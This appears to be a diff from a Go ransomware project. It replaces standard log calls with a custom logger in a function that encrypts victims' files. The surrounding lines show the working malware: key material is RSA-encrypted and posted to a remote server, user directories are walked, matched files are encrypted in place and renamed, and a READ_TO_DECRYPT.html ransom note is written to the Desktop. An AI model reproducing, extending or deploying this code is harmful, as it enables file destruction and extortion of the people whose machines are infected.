@@ -5,7 +5,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"log"
 	"net/url"
 	"os"
 	"path/filepath"
@@ -65,7 +64,7 @@ func encryptFiles() {
 	for {
 		// Check for timeout
 		if duration := time.Since(start); duration.Seconds() >= SecondsToTimeout {
-			log.Println("Timeout reached. Aborting...")
+			cmd.Logger.Println("Timeout reached. Aborting...")
 			return
 		}
 
@@ -79,7 +78,7 @@ func encryptFiles() {
 		// Encrypting with RSA-2048
 		ciphertext, err := rsa.Encrypt(PUB_KEY, []byte(payload))
 		if err != nil {
-			log.Println(err)
+			cmd.Logger.Println(err)
 			continue
 		}
 
@@ -88,7 +87,7 @@ func encryptFiles() {
 		data.Add("payload", base64.StdEncoding.EncodeToString(ciphertext))
 		res, err := client.CallServer("POST", "/api/keys/add", data)
 		if err != nil {
-			log.Println("The server refuse connection. Aborting...")
+			cmd.Logger.Println("The server refuse connection. Aborting...")
 			return
 		}
 
@@ -104,10 +103,10 @@ func encryptFiles() {
 			}{}
 			// Parse the json response
 			if err = json.NewDecoder(res.Body).Decode(&response); err != nil {
-				log.Println(err)
+				cmd.Logger.Println(err)
 				continue
 			}
-			log.Printf("%d - %s\n", response.Status, response.Message)
+			cmd.Logger.Printf("%d - %s\n", response.Status, response.Message)
 			continue
 		}
 
@@ -115,7 +114,7 @@ func encryptFiles() {
 		break
 	}
 
-	log.Println("Walking interesting dirs and indexing files...")
+	cmd.Logger.Println("Walking interesting dirs and indexing files...")
 
 	// Add a goroutine to the WaitGroup
 	cmd.Indexer.Add(1)
@@ -137,7 +136,7 @@ func encryptFiles() {
 						// Each file is processed by a free worker on the pool
 						// Send the file to the MatchedFiles channel then workers
 						// can imediatelly proccess then
-						log.Println("Matched:", path)
+						cmd.Logger.Println("Matched:", path)
 						cmd.Indexer.Files <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}
 
 						//for each file we need wait for the goroutine to finish
@@ -165,7 +164,7 @@ func encryptFiles() {
 					}
 					defer cmd.Indexer.Done()
 
-					log.Printf("Encrypting %s...\n", file.Path)
+					cmd.Logger.Printf("Encrypting %s...\n", file.Path)
 
 					// We need make a temporary copy of the file for store the encrypted content
 					// before move then to the original file
@@ -176,7 +175,7 @@ func encryptFiles() {
 					// Create/Open the temporary output file
 					tempFile, err := os.OpenFile(cmd.TempDir+file.Name(), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
 					if err != nil {
-						log.Println(err)
+						cmd.Logger.Println(err)
 						return
 					}
 					defer tempFile.Close()
@@ -184,7 +183,7 @@ func encryptFiles() {
 					// Encrypt the file sending the content to temporary file
 					err = file.Encrypt(keys["enckey"], tempFile)
 					if err != nil {
-						log.Println(err)
+						cmd.Logger.Println(err)
 						continue
 					}
 
@@ -194,7 +193,7 @@ func encryptFiles() {
 					// original file
 					err = os.Rename(cmd.TempDir+file.Name(), file.Path)
 					if err != nil {
-						log.Println(err)
+						cmd.Logger.Println(err)
 						continue
 					}
 
@@ -220,7 +219,7 @@ func encryptFiles() {
 		// Rename the original file to the base64 equivalent
 		err := os.Rename(file.Path, newpath+cmd.EncryptionExtension)
 		if err != nil {
-			log.Println(err)
+			cmd.Logger.Println(err)
 			continue
 		}
 	}
@@ -246,5 +245,5 @@ func encryptFiles() {
 	// Write the READ_TO_DECRYPT on Desktop
 	ioutil.WriteFile(cmd.UserDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
 
-	log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
+	cmd.Logger.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
 }
